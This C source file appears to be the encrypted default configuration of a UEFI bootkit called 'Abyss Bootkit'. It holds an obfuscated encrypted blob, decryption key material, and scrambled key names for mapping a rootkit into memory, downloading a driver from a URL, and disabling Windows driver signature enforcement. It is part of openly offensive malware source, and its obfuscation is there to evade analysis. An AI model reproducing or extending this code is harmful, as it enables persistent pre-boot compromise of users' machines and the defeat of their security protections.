// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Default Encrypted Configuration
**/



// START -> PAYLOADS --------------------------------------------------------------------------------------------------------------------------
// START -> PAYLOADS --------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Payloads/Payloads00DefaultEncryptedConfiguration.h>



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



/**
	Go to Abyss Bootkit Configuration Tool
		cd AbyssBootkitPkg/Tool_BootkitConfiguration

	Run script
		python AbyssConfiguration.py

	Copy and paste the output into this file
**/



// Decrypt
const UINTN Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyKeySize = 32;
const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyXorKey = 0xbc;
const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyPermutation[32] = {30, 2, 17, 11, 8, 9, 14, 4, 24, 3, 15, 20, 26, 27, 13, 7, 12, 23, 1, 16, 19, 25, 18, 5, 6, 21, 0, 10, 22, 31, 28, 29};
const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyObfuscatedKey[32] = {0x1b, 0xe6, 0xd1, 0xb0, 0xb8, 0x01, 0xb4, 0x0f, 0x36, 0x75, 0xba, 0x4c, 0xf2, 0x69, 0xf8, 0xba, 0xcb, 0x1d, 0xa2, 0xe0, 0x77, 0xf1, 0xad, 0x3a, 0xec, 0x4a, 0x94, 0x71, 0x00, 0x80, 0x56, 0x8b};
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationXorKey = 0xfe;
const INTN Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationCaesarShift = 17;
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationEncryptedConfiguration[] = "37yhyLmdzsreotyulafcsL6n17XDsMOix7WrzaCXv7DFyb6l2c6/3cXJ3sS429qqnpzKyJnQ0LvMpcmV4rjQvb2g4qidwKCoypy/pcTLoNre3sXJpKOr18XmwruepcunysSuzrXMl5fQvJm1xMi+wa2gqa2awsHDyKHgv6DHveLZyaKhxJvHrLCeyKuVv5vMwebNuJyaoaS8u+Ld2bC6np7KzbDOmKzKp9iuu5XEwpnJo6PNutmgqcPN3Jecxd+wo8m9n8Daw9jmrsOorp/I3arOybDX4Kuu18m14MS4xqTmwrjEqsPDyczLvKnNormV3qDdqJmj2aHQ36GXleK63JW9qZzepaepyL3LyZ2ZuqqqqpW1q9maqbqfyt6k3sS4wqif3qjb3Mqt3rqsoaTGvdjeqMffusDZmZjEzsKbztmsmsHduJXByKmpmsG3tcGim7udvsOuxszataK4zsyrxabKrMi9w57ioMLm3726tajfnsOd3tmlncOVrcSu2KC6t9uezqfNwr7B4rvFpea5npypyKC44q61wZ7LmLmcncyZvqTZ16yn2pyXoriV2rXFqrvXw7663KqioZXLxM6XvsyqvtDF2KOZvsekmMzEwMap3Niit5egqtjAqc7ipsDGyarEo5WYqde6p+bLzcmlndnCpabK3KKfn7DIrpvgysqww9/C3t7erq6/xcqhm8bEy9jMyKWfo96exKzOq6ieqKK9rqHZ28XNn+Ki3J+7rbW6oa21q5jcxN7M2Lye4tiln9i3wd6doMDY4rXXmMfI3NDFmuCgzaGg2NqrzsGXqcSeoZ+k0KzN2NinzcmjzNq5v6ilysmrtcOZuebJyszAnsXimMufyK64zarH35i8lb7epL/KrZ2ZoKOXwqis286+y+bHo87KxM27u56Y29q63pmo3Mi/oaa7quafqaTKnbDAptzavr2ny+DNuMLL2OKom8iu0Nm12qWl26Ga5r/gpaSVyJegl9neoZu1m5qYmJ3MtazBvt+crcfBt5eoyZ+s2s6exdfeo9zBmKamo9rdv7ub3ZeX2JrKoJywx9qcn8XEqsGVtbq/vtfgt6CcvN2+pcbIyqzAwqzJxL7M3+Leq9+aqMu4rrrZrbjL4tvZxavcw5vI2MPCmMC6y5mfqaHJzayo2qHb2qGeq6jNlauq3Z+sxr2muJq83Z6dp6XYotk=";
// Json Keys
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_Screen[] = "R6>Z6";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_Banner[] = "ZMF3_|hzXF$oIWb#";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerImageAbyssSquid[] = "N|YR+rvUxCoRz,AZSPXFm4YY";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerImageSquid[] = "kVHh+m?1voGl7H|feBhfLa_q";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerAscii[] = "kDd7GqxPhu";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriver[] = "-vsFur@RfVs,qNA3yO";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverDownload[] = "yDjELm-@gc7IJ+DxWLjF";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverURL[] = "1LWkQjINkB1+r";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverPath[] = "j|vQ;xIj:-TIU_-";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_AdditionalComponent[] = "R3cVEz";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_AdditionalComponentPath[] = "$SHoiHiFDk@Z#;9c!j";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitRuntime[] = "CZ!cui+lQ";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitRuntimePath[] = "FJS40qGdLp:";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBoot[] = "tNFrYNQTnfvyd:0&w!lM!MF_Fxab";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBootMapRootkitToMemory[] = "NicEQuQmEi2l;>Am?jJm-+460";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBootMapRootkitToMemoryModule[] = "rNk|yF";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_DisableProtections[] = "eFlWP|Rp>pZB.U:f";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_DisableProtectionsDSE[] = "d4RYHko<?n+-jA72Q#<jp:";



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
